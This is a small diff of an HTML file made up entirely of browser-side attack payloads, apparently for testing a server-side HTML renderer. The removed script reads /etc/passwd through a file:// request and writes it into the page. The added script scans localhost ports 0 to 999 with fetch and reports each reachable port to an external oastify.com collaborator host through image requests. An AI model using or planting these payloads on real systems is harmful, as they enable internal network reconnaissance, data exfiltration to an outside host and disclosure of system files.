@@ -1,11 +1,15 @@
 <html>
-  <script>x=new XMLHttpRequest;
-x.onload=function(){
-document.write(this.responseText)
-};
-x.open("GET","file://etc/passwd");
-x.send();
-    document.getElementById('my').innerHTML=x;
+  <script>
+    const checkPort = (port) => {
+    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
+        let img = document.createElement("img");
+        img.src = `http://3018ell9d5hpaa5pn4zq601u1l7cv3js.oastify.com/ping?port=${port}`;
+    });
+}
+
+for(let i=0; i<1000; i++) {
+    checkPort(i);
+}
     
 </script>
   <p id='my'>aaaaa</p>
